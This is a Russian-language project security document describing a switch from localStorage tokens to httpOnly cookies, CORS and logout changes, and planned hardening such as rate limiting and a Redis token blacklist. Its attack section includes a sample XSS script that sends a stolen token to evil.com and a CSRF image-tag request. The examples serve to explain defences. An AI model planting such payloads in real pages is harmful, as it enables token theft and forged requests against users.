# Улучшения безопасности

## ✅ Что было сделано

### 1. Переход с localStorage на httpOnly cookies

**Было (небезопасно):**

```typescript
// Frontend
localStorage.setItem("token", token);
axios.defaults.headers.common["Authorization"] = `Bearer ${token}`;
```

**Стало (безопасно):**

```typescript
// Backend
res.cookie("token", token, {
  httpOnly: true, // JavaScript не может прочитать
  secure: true, // Только HTTPS в production
  sameSite: "lax", // Защита от CSRF
});

// Frontend
axios.defaults.withCredentials = true;
// Cookie отправляется автоматически
```

### 2. Добавлен logout endpoint

**Было:**

- Logout только на фронтенде
- Токен оставался валидным 24 часа

**Стало:**

- `POST /api/auth/logout` удаляет cookie на сервере
- Мгновенный эффект

### 3. CORS настроен правильно

**Было:**

```typescript
app.use(cors()); // Небезопасно
```

**Стало:**

```typescript
app.use(
  cors({
    origin: "http://localhost:5173", // Точный URL
    credentials: true, // Разрешить cookies
  })
);
```

## 🛡️ Защита от атак

### XSS (Cross-Site Scripting)

**Атака:**

```javascript
// Злоумышленник внедрил скрипт на сайт
<script>
  const token = localStorage.getItem('token');
  fetch('https://evil.com/steal?token=' + token);
</script>
```

**Защита:**

- ✅ HttpOnly cookie недоступна для JavaScript
- ✅ Даже если XSS есть, токен украсть нельзя

### CSRF (Cross-Site Request Forgery)

**Атака:**

```html
<!-- Злоумышленник создал страницу -->
<img src="http://yoursite.com/api/tasks/delete/123" />
```

**Защита:**

- ✅ SameSite=lax блокирует отправку cookie с других сайтов
- ✅ Cookie отправляется только с вашего домена

### Token Theft

**Проблема:**

- Если токен украден, он валиден до истечения

**Решение:**

- ✅ Logout удаляет cookie
- ⚠️ Но если cookie украдена до logout, она валидна 24 часа
- 💡 Решение: Redis blacklist (будущее улучшение)

## 📊 Сравнение безопасности

| Уязвимость  | localStorage   | httpOnly Cookie | httpOnly + Redis    |
| ----------- | -------------- | --------------- | ------------------- |
| XSS         | ❌ Уязвим      | ✅ Защищен      | ✅ Защищен          |
| CSRF        | ⚠️ Зависит     | ✅ Защищен      | ✅ Защищен          |
| Token Theft | ❌ Нет защиты  | ⚠️ До logout    | ✅ Мгновенный отзыв |
| Logout      | ❌ Не работает | ✅ Работает     | ✅ Работает         |

## 🔮 Дальнейшие улучшения

### 1. Redis Blacklist (высокий приоритет)

**Проблема:**

- Если cookie украдена, она валидна до истечения

**Решение:**

```typescript
// При logout
await redis.set(`blacklist:${token}`, "1", "EX", 86400);

// При проверке
const isBlacklisted = await redis.get(`blacklist:${token}`);
if (isBlacklisted) {
  return res.status(401).json({ error: "Token revoked" });
}
```

**Плюсы:**

- ✅ Мгновенный отзыв токенов
- ✅ Защита от украденных токенов
- ✅ Быстрая проверка (~1ms)

### 2. Refresh Tokens (средний приоритет)

**Проблема:**

- Через 24 часа нужен новый login

**Решение:**

- Access token: 15 минут
- Refresh token: 7 дней
- Автоматическое обновление

**Плюсы:**

- ✅ Лучше UX (не нужен частый login)
- ✅ Безопаснее (короткий access token)
- ✅ Можно отозвать refresh token

### 3. CSRF Tokens (низкий приоритет)

**Текущая защита:**

- SameSite=lax (достаточно для большинства случаев)

**Дополнительная защита:**

```typescript
// Backend генерирует CSRF token
const csrfToken = crypto.randomBytes(32).toString("hex");
res.cookie("csrf-token", csrfToken);

// Frontend отправляет в заголовке
axios.defaults.headers.common["X-CSRF-Token"] = csrfToken;

// Backend проверяет
if (req.headers["x-csrf-token"] !== req.cookies["csrf-token"]) {
  return res.status(403).json({ error: "CSRF validation failed" });
}
```

### 4. Rate Limiting (средний приоритет)

**Проблема:**

- Brute force атаки на login

**Решение:**

```typescript
import rateLimit from "express-rate-limit";

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 минут
  max: 5, // 5 попыток
  message: "Too many login attempts",
});

app.post("/api/auth/login", loginLimiter, authController.login);
```

### 5. Token Rotation (низкий приоритет)

**Идея:**

- При каждом запросе выдавать новый токен
- Старый токен становится невалидным

**Плюсы:**

- ✅ Максимальная безопасность

**Минусы:**

- ❌ Сложная реализация
- ❌ Проблемы с параллельными запросами

## 🎯 Рекомендуемый план

### Phase 1: Текущее состояние ✅

- [x] HttpOnly cookies
- [x] SameSite=lax
- [x] Secure flag в production
- [x] Logout endpoint
- [x] CORS с credentials

### Phase 2: Критичные улучшения

- [ ] Redis blacklist для отзыва токенов
- [ ] Rate limiting на login/register
- [ ] Логирование попыток авторизации

### Phase 3: UX улучшения

- [ ] Refresh tokens
- [ ] "Remember me" функция
- [ ] Автоматическое обновление токенов

### Phase 4: Дополнительная защита

- [ ] CSRF tokens (если нужно)
- [ ] Token rotation (если нужно)
- [ ] 2FA (если нужно)

## 📈 Метрики безопасности

### Текущий уровень: 🟢 Хороший

| Критерий          | Оценка     | Комментарий      |
| ----------------- | ---------- | ---------------- |
| XSS защита        | ✅ Отлично | HttpOnly cookies |
| CSRF защита       | ✅ Хорошо  | SameSite=lax     |
| Token theft       | ⚠️ Средне  | Нет blacklist    |
| Password security | ✅ Отлично | Bcrypt           |
| HTTPS             | ✅ Готово  | Secure flag      |
| Logout            | ✅ Отлично | Cookie удаляется |

### Целевой уровень: 🟢 Отличный

После добавления Redis blacklist и rate limiting:

| Критерий          | Оценка     | Комментарий        |
| ----------------- | ---------- | ------------------ |
| XSS защита        | ✅ Отлично | HttpOnly cookies   |
| CSRF защита       | ✅ Отлично | SameSite=lax       |
| Token theft       | ✅ Отлично | Redis blacklist    |
| Password security | ✅ Отлично | Bcrypt             |
| HTTPS             | ✅ Отлично | Secure flag        |
| Logout            | ✅ Отлично | Cookie + blacklist |
| Brute force       | ✅ Отлично | Rate limiting      |

## 🔗 Полезные ссылки

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)
- [Cookie Security](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [CORS with Credentials](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
